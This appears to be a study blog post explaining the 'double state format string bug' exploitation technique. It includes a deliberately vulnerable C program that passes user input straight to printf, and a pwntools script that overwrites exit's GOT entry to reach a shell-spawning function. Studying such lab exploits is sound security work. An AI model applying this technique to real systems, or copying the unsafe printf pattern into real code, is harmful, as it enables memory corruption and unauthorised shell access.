---
title: "[PWNABLE]DSFSB"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ Double State Format String Bug This is an fsb technique used in situations where the buffer is declared as a global variable. //gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c#include"
date: "2024-06-24"
translation_key: "tistory-d0f6d31273dc"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-dsfsb"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※**** 

#### **Double State Format String Bug**

This is an fsb technique used in situations such as when a buffer is declared as a global variable.

```
//gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

char buf[128];

void gift() {
    printf("Hello! ZZoMblE");
    system("/bin/sh");
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
    char str[128] = "Hello! whrd\n";
    printf("%s",str);
    puts("input 1 : ");
    read(0,buf,128);
    printf(buf);

    puts("input 2 : ");
    read(0,buf,128);
    printf(buf);

    exit(0);
}
int main() {
    initialize();
    vuln();
    return 0;
}
```

Let’s take a look at the example above.

You can see that two fsb vulnerabilities are opened in vuln().

Unlike the previous fsb, the buffer received through read() is a global variable, not a local variable, so the method below cannot be used.

```
%1234c%20$n0x401010
```

In this case, the part where the memory points back to memory must be utilized.

To help you understand what this means, let's look at the example below.

![](/assets/images/tistory/tistory-d0f6d31273dc/001.png)

Based on the picture above, the expression "memory points to memory" means the sfp-like part of vuln().

The sfp of vuln() points to the sfp of main(). Even if it is not sfp, it can be used if the memory points to another writable memory area.

Then how should I do it??

You must go through two major processes. First, insert the GOT address of exit() into sfp of main(). Afterwards, if you calculate the offset and overwrite it with gift(), you can perform GOT Overwrite through dsfsb.

```
from pwn import *

target = b'./ex'

p = process(target)
e = ELF(target)

gift = e.sym['gift']
exit_got = e.got['exit']

payload = '%{}c'.format(exit_got)
payload += '%22$n'

p.sendafter(b':', payload)

payload = '%{}c'.format(gift)
payload += '%24$n'
p.sendafter(b':', payload)

p.interactive()
```

The payload is very simple, as shown above.

After sending the first payload, you can see that the sfp of main() has changed as shown below.

![](/assets/images/tistory/tistory-d0f6d31273dc/002.png)

After sending the second payload, you can see that the GOT value of exit() has been modified as shown below.

![](/assets/images/tistory/tistory-d0f6d31273dc/003.png)

Finally, gift() is executed as shown below to obtain a shell.

![](/assets/images/tistory/tistory-d0f6d31273dc/004.png)